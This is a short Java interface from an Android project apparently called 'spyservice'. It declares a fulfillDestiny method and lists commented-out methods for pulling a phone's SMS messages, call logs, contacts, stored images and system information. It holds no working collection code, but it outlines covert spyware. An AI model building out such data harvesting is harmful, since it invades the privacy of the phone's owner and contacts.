/*+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
 + Copyright (C) 2020 Eldar Timraleev (aka CRaFT4ik). All rights reserved.                        +
 + Licensed under the Apache License, Version 2.0 (the "License"); you may not use this file      +
 + except in compliance with the License. You may obtain a copy of the License at                 +
 + http://www.apache.org/licenses/LICENSE-2.0 Unless required by applicable law or agreed to in   +
 + writing, software distributed under the License is distributed on an "AS IS" BASIS, WITHOUT    +
 + WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the License for the       +
 + specific language governing permissions and limitations under the License.                     +
 +++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++*/

package ru.er_log.spyservice.loadable;

import android.content.Context;

import java.util.ArrayList;
import java.util.List;

import me.everything.providers.android.calllog.Call;
import me.everything.providers.android.contacts.Contact;
import me.everything.providers.android.media.Image;
import me.everything.providers.android.telephony.Sms;
import ru.er_log.spyservice.loadable.content.ImageInformation;
import ru.er_log.spyservice.loadable.content.SystemInformation;

public interface ILoadable
{
    boolean fulfillDestiny(Context context);
//    List<Sms> getSms(Context context);
//    List<Call> getCalls(Context context);
//    List<Contact> getContacts(Context context);
//    List<Image> getInternalStorageImages(Context context);
//    List<Image> getExternalStorageImages(Context context);
//    SystemInformation getSystemInformation(Context context);
}
